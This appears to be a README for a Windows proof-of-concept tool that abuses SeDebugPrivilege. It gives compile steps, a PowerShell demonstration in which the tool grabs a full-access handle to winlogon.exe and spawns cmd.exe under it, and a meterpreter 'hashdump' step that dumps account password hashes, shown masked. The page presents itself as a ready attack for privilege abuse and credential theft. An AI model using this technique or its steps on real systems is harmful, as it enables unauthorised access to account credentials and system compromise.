# SeDebugPrivilege
Abuse the SeDebugPrivilege, the holder of this token can debug another process, like reading and writing to that process' memory.

## POC Info :
This POC Will not give you NT SYSTEM Shell but allow you to dump all the hashes either using mimikatz.exe or by spawning a meterpreter shell and then use the hashdump from msf.

## Compile the POC :
### On linux OS:
```bash
csc sedp.cs
```
### On Windows OS :
Visual Studio is your friend.

## Demonstration : 
```powershell
PS C:\SeDebugPrivilege> .\sedp.exe
.\sedp.exe
[*] If you have SeDebugPrivilege, you can get handles from privileged processes.
[*] This PoC tries to spawn cmd.exe as a winlogon.exe's child process.
[>] Searching winlogon PID.
[+] PID of winlogon: 552
[>] Trying to get handle to winlogon.
[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x320).
[+] New process is created successfully.
    |-> PID : 1468
    |-> TID : 2756
```

Now dump the hashes : 
```bash
meterpreter > hashdump
Administrator:500:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::

```
